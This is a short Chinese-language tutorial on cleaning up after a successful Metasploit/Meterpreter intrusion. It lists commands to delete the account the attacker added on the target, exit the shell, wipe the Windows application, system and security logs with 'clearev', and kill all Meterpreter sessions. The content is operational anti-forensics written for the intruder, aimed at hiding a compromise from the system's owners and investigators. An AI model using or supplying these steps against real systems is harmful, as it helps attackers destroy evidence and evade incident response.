# MSF-Meterpreter清理日志

在我们用MSF成功对目标进行了渗透之后，不要忘记要清理渗透过程中留下的日志，下面就如何清理日志和大家分享下。

步骤如下：

- 删除之前添加的账号
- 删除所有在渗透过程中使用的工具
- 删除应用程序、系统和安全日志
- 关闭所有的Meterpreter连接

## 删除之前添加的账号

```
C:\Windows\system32> net user 添加的用户名 /del
```

## 退出目标服务器的shell

```
C:\Windows\system32> exit
或者
C:\Windows\system32> logoff
```

## 删除日志

```
meterpreter > clearev
```

## 退出meterpreter shell

```
meterpreter > exit
```

## 查看所有的MSF连接

```
msf exploit(multi/handler) > sessions
```

## 关闭所有的MSF链接

```
msf exploit(multi/handler) > sessions -K
```

## 